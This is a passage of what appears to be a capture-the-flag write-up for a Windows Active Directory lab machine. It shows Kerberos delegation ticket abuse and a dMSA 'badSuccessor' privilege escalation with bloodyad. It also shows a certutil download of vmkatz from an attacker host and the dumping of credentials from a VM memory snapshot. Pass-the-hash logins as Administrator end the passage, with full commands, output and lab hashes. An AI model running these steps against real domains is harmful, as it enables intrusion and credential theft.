  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: j0ENc0pEx9DirYqgO8KZ1ffYjtcw+ZL0XDkqmyKflJc=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIF1DCC.....
PS C:\Users\ryan.brooks\Documents>
```

Taking the base64 blob to my Linux machine, convert it to a ccache file for further usage.

```bash
$ echo "doIF1DC...." | base64 -d > ryan.brooks.kirbi

$ ticketConverter.py ryan.brooks.kirbi ryan.brooks.ccache
Impacket v0.14.0.dev0+20261015.95810.75938fcb - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done
```

## dMSA - AGAIN

Using Ryan's TGT to list what he can write in the domain, we can glance the same artifacts we saw above when we abused dMSA to get access over Mark Davies. This time, Ryan has WRITE permissions over `svc_deploy` and `CREATE_CHILD` over the OU `distinguishedName: OU=DMSAHolder,DC=checkpoint,DC=htb`.

```bash
$ bloodyad -H dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k get writable                                                   
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=DMSAHolder,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Ryan Brooks,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

$ bloodyad -H dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k add badSuccessor hacker2 -t "CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB"
[+] Creating DMSA hacker2$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB

Realm        : CHECKPOINT.HTB
Sname        : krbtgt/CHECKPOINT.HTB
UserName     : hacker2$
UserRealm    : checkpoint.htb
StartTime    : 2026-6-29 04:06:47+00:00
EndTime      : 2026-6-29 13:55:33+00:00
RenewTill    : 2026-6-05 03:55:33+00:00
Flags        : enc-pa-rep, renewable, pre-authent, forwardable, forwarded
Keytype      : 18
Key          : GgeFA0ov0kMZZpi+71gxUcxr1klloK3qH+yF57XOGNw=
EncodedKirbi :

    doIFzzCCBcugAwIBBaEDAgEWooIEvTCCBLlhggS1MIIEsaADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3Ji
    dGd0Gw5DSEVDS1BPSU5ULkhUQqOCBHEwggRtoAMCARKhAwIBAqKCBF8EggRbWPTn+oX1vyRnOqfMXuqFBLSTgwWJCw7oJ2+hXx07
    ScHScSaq38eOIpaQhUrA3B7XU9/7pIzJUl3inMQPsgJjcdxlrWUA+gbq48zgS4fYrIDZfOWYc8NLy9MVirZ3bu2SKITF+5bj1FY5
    0unqpuTjFJ//PpccKtvKU1VhKu9BSTok6DqmUR2nEKthXJaFTpbIFJzQFOCY0BSsYNWiyapzafuLyo6gYEkiOg6lviOFuP9hUqTA
    b36q79bqWTNdxCr3BlOKiR8gTHWeXfMqn6+TlsRAsvomTd05j6+7Pvkz1+SSGQ5xQTSmTGeUJyVy8qdgb3+ALoeH5yYNjfc7sOar
    rXoKuWI81pFBG7ZMEKkIVc4XPAJbHTMyO7sjIp+jp6yY9HFCEv8IfWvwZO8+NEwxn1MBzEXvBFyGSEd3ykBquA41aMQvQanjWXxU
    GMxLjozQ+Tr6O6MzILwYuGqrkrxbd4cXclGJkrM4od/Uph0+rILn3jy1f0PJMSOra6cRphhUsdkJxocbqQ1a9P03WVoG4xdM/2Pm
    NhN7BHJ/kGHSZRI+bbHnLayiAl/+m1rMohTsPzHwPlcL1kMBq4E9sJYQIOPcb1xz07ImvkRl2yBiZRVmUJO9G944p9PPep32qogh
    9g3jpeLl/v/esnxkIPp4xdRDMck2TpZ5nL814zpgeNbxAfIK1qT7NDwDglx1d8qj4SZq8N8V3wcOpAMZv4R1Q9sMXXvUIuuyP43H
    mHmdQImGsIVdrb83I2cmvMR97BiM7pLnhvdKH5bvtCQLjieIxm6BazCPjjKZhEswIIhubWrDESaspACp+MtvWMoy3YTkfgkMT9RR
    Kk+G+gyVZ3kD9yYCQG/w3qoNoeasfhDD9A1NbG8jZznAarjUZ+mZVS0BUNF/Ok9qyRxgRTLDxU2WckslnnimZILH85/eQGdeLh5L
    Dt2nIgq8B9+xWASnRhWp6hujLewdf2cDNBFspZmAvNkqjo3HkGiJLVJAMVsZ52iIZ+DvCioV1istJdfziZFKXsjjeEbYgumMMX7f
    siGVdEi9ETrWEhJZzFLgRQzPMFKRYZB0gs18fnwwg8UVWU/uyL9AhTpOsVZzqyN/m3tKDRMtSu9TmcAox5up2Qf9Vo0vFSBJGv6c
    A4oAX/Wp/J8QcwgprLT30leedVExpjKpHx/03ZAShjvUgqNo0jq3rl55moxByuSA7ZDGiqIPRsyXCkad+bQFgoDlrJO0UKd7UGbX
    R+cI+nNHJrnz9MU8SUb3UEBfkaHUqZOxO1GhPu3Hq9BVWM0jnQLNv5VQNQpGmdoEPtdBWJTLRZgLRQFCxgPO3nO7vHLs29sA4jb0
    L8kALXFAYJ+gN1g3vcwv0gapLkf57YI3LnIfmIEoU3i1X18Ve40tyN5fbV+BFygbGSA6wWQDmQ292NaqZNSFpXLawmt5WaOLFbgY
    SCNb9E+NcbTQN40ZfrSBfWF8pxHgJF3jk9SenXQmtlSIHSyjgf0wgfqgAwIBAKKB8gSB732B7DCB6aCB5jCB4zCB4KArMCmgAwIB
    EqEiBCAaB4UDSi/SQxlmmL7vWDFRzGvWSWWgreof7IXntc4Y3KEQGw5jaGVja3BvaW50Lmh0YqIVMBOgAwIBAaEMMAobCGhhY2tl
    cjIkowUDAwBgoaQRGA8yMDI2MTAyOTAzNTUzM1qlERgPMjAyNjEwMjkwNDA2NDdaphEYDzIwMjYxMDI5MTM1NTMzWqcRGA8yMDI2
    MTEwNTAzNTUzM1qoEBsOQ0hFQ0tQT0lOVC5IVEKpIzAhoAMCAQKhGjAYGwZrcmJ0Z3QbDkNIRUNLUE9JTlQuSFRC
[+] dMSA TGT stored in ccache file hacker2_sL.ccache

dMSA current keys found in TGS:
AES256: e5d6500976f7ec32a7a3bf8dc7f0495943c5cf3730523365e7532de6f933b501
AES128: cf75fef31c5b91a0c7c4c652c31f53bb
RC4: 380efdef2dab2b6009b70a470265f141

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e16081eb077aca74bdbf8af12af43ac9
```

This time bloodyad auto fetching a dMSA TGT successfully worked on encryption type negotiation and we got `svc_deploy` account NT hash in the `dMSA previous keys`.

## VMBackups

Listing the DC shares using `svc_deploy` account, we can see that this account has read permissions over the VMBackups share.

```bash
$ nxc smb checkpoint.htb -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9 --shares
SMB         10.129.187.153   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.187.153   445    DC01             [+] checkpoint.htb\svc_deploy:e16081eb077aca74bdbf8af12af43ac9
SMB         10.129.187.153   445    DC01             [*] Enumerated shares
SMB         10.129.187.153   445    DC01             Share           Permissions     Remark
SMB         10.129.187.153   445    DC01             -----           -----------     ------
SMB         10.129.187.153   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.187.153   445    DC01             C$                              Default share
SMB         10.129.187.153   445    DC01             DevDrop                         VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.187.153   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.187.153   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.187.153   445    DC01             SYSVOL          READ            Logon server share
SMB         10.129.187.153   445    DC01             VMBackups       READ
```


```bash
$ smbclient.py checkpoint.htb/'svc_deploy'@dc01.checkpoint.htb -hashes :e16081eb077aca74bdbf8af12af43ac9
# use VMBackups
# ls
drw-rw-rw-          0  Wed May 13 16:58:05 2026 .
drw-rw-rw-          0  Sat May  9 17:42:27 2026 ..
drw-rw-rw-          0  Wed May 13 16:58:18 2026 NightlyBackup_2024-11-01
# cd NightlyBackup_2024-11-01
# ls
drw-rw-rw-          0  Wed May 13 16:58:18 2026 .
drw-rw-rw-          0  Wed May 13 16:58:05 2026 ..
drw-rw-rw-          0  Wed May 13 16:58:18 2026 memory forensics
# cd memory forensics
# ls
drw-rw-rw-          0  Wed May 13 16:58:18 2026 .
drw-rw-rw-          0  Wed May 13 16:58:18 2026 ..
-rw-rw-rw-  106496000  Wed May 13 16:58:18 2026 Windows Server 2019-000001.vmdk
-rw-rw-rw- 2147483648  Wed May 13 16:58:18 2026 Windows Server 2019-Snapshot1.vmem
-rw-rw-rw-  138164859  Fri May 15 01:32:32 2026 Windows Server 2019-Snapshot1.vmsn
-rw-rw-rw-     270840  Wed May 13 16:58:18 2026 Windows Server 2019.nvram
-rw-rw-rw-       7642  Wed May 13 16:58:18 2026 Windows Server 2019.scoreboard
-rw-rw-rw- 10199695360  Wed May 13 16:58:18 2026 Windows Server 2019.vmdk
-rw-rw-rw-        502  Wed May 13 16:58:18 2026 Windows Server 2019.vmsd
-rw-rw-rw-       2749  Wed May 13 16:58:18 2026 Windows Server 2019.vmx
-rw-rw-rw-        274  Wed May 13 16:58:18 2026 Windows Server 2019.vmxf
```

`.vmem` file (raw RAM dump) and a `.vmsn` (snapshot state). This is  a live memory capture of a Windows server, we can loot LSASS secrets, cached credentials, and potentially plaintext material out of the memory image.

### VMKatz

We can use a memory forensics tool such volatility, BUT, two months before the machine release, I saw and saved this great [post](https://lnkd.in/p/eXpaEYaN) in Linked from [Nicolas Devillers](https://www.linkedin.com/in/nicolasdevillers/), releasing a tool called [VMkatz](https://github.com/nikaiw/VMkatz) that extracts Windows credentials directly from VM snapshots.

```powershell
$ evil-winrm -i dc01.checkpoint.htb -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9

Evil-WinRM shell v4.1

Info: Establishing connection to remote endpoint

Info: Connection successful
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> ls C:\

    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          4/1/2024  12:02 AM                PerfLogs
d-r---         5/14/2026   3:15 PM                Program Files
d-r---         1/14/2026  10:51 AM                Program Files (x86)
d-----         5/18/2026   6:31 PM                Scripts
d-----          5/9/2026   7:42 AM                Shares
d-r---        10/28/2026  10:35 PM                Users
d-----         5/21/2026   4:22 PM                Windows

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> cd C:\ProgramData
*Evil-WinRM* PS C:\ProgramData> certutil.exe -urlcache -f -split http://10.10.17.249/vmkatz.exe vmkatz.exe
****  Online  ****
  000000  ...
  243200
CertUtil: -URLCache command completed successfully.

*Evil-WinRM* PS C:\ProgramData> .\vmkatz.exe "C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmem"

vmkatz.exe : [*] vmkatz v1.4.1
    + CategoryInfo          : NotSpecified: ([*] vmkatz v1.4.1:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[*] System discovery: 11.7119149s[*] Process enumeration: 2.9067ms[*] Providers: MSV(ok) WDigest(ok) Kerberos(ok) TsPkg(empty) DPAPI(ok) SSP(empty) LiveSSP(n/a) Credman(empty) CloudAP(empty)
[*] Credential extraction: 35.3864ms
[+] 2 logon session(s), 2 with credentials:

  LUID: 0x3e4 (NETWORK SERVICE)
  Username: WIN-0DG6SJAEUTA$
  Domain: WORKGROUP
  [DPAPI]
    GUID          : 632b77c8-5e1a-4479-8e35-baa290fdd6ae
    MasterKey     : 15e104f6de4e478c6bf55252632a25b973fccd39c2be8cc0d5b15a5dec06029f02fe0a02a3e57eb3b55f077f83a283cd0a11f6b3c6508d9e585527de78dc989e
    SHA1 MasterKey: 44bb34a624afcd186909843e6cbdb4cfee908975
  [DPAPI]
    GUID          : 57e1a5d6-bbd4-44e9-a5c4-f4241b0821b0
    MasterKey     : 95f668c165e7c0b3bd1f525330e5a647b9c9c8da7320c6fbdb4518a588bac996567e04f22b28d4f7a2abd33fafe0958522bca1aaa0de00f5edb7d6742065642d
    SHA1 MasterKey: b2bf2c648554143d6b28b3c06a1ece7e40867238
  [DPAPI]
    GUID          : 4f09a449-22e7-4a65-a4b9-fac89cc25328
    MasterKey     : e4778f7e1b8351eade5c49bb8e32503fbbaa705bb7e26eef5785e0a8200e31fcc2458a4db00e03aaabef34bd47900beee2d8a5bb73ddd904fbe279089a1ea718
    SHA1 MasterKey: 90b1c277630e507a8e28d7b260a53f21712c3f1d

  LUID: 0x14016d
  Session: 2 | LogonType: Unknown
  Username: Administrator
  Domain: WIN-0DG6SJAEUTA
  LogonServer: WIN-0DG6SJAEUTA
  LogonTime: 2026-05-09 14:07:14 UTC
  SID: S-1-5-21-2823729479-30462974-3865623546-500
  [MSV1_0]
    NT Hash : f29e9c014295b9b32139b09a2790be3b
    SHA1    : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
    DPAPI   : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
  [DPAPI]
    GUID          : c53f7d5b-2902-415c-9c09-251f39974440
    MasterKey     : 32cc5c309067ca0994b849897a9b85b89511547030a1d8b74fe6e37ba037a4161301ffce692e6e433c3821dc18abfe208e1dc5c458de79d1352c6681e18bde15
    SHA1 MasterKey: b061f87be6d2776897d912fed9156a354b81a595

[*] 2 sessions, 1 NT hashes, 0 plaintext passwords

*Evil-WinRM* PS C:\ProgramData> exit
```

We can see that the VM has 2 logon sessions, one for the machine account and the other for the Administrator, Validating the extracted Administrator NT Hash and getting the root flag :}.

```bash
$ nxc smb checkpoint.htb -u Administrator -H f29e9c014295b9b32139b09a2790be3b
SMB         10.129.187.153   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.187.153   445    DC01             [+] checkpoint.htb\Administrator:f29e9c014295b9b32139b09a2790be3b (Pwn3d!)

$ evil-winrm -i dc01.checkpoint.htb -u Administrator -H f29e9c014295b9b32139b09a2790be3b
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd ..\..\
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         5/25/2026   6:26 PM                Administrator
d-----         5/25/2026   6:34 PM                max.palmer
d-r---          5/9/2026  12:30 AM                Public
d-----         5/21/2026   4:19 PM                ryan.brooks
d-----         6/14/2026  12:56 AM                svc_deploy


*Evil-WinRM* PS C:\Users> cd max.palmer
*Evil-WinRM* PS C:\Users\max.palmer> cd Desktop
*Evil-WinRM* PS C:\Users\max.palmer\Desktop> ls


    Directory: C:\Users\max.palmer\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         6/11/2026  12:55 PM             34 root.txt


*Evil-WinRM* PS C:\Users\max.palmer\Desktop> cat root.txt
4c7af1c8****
```

GG.

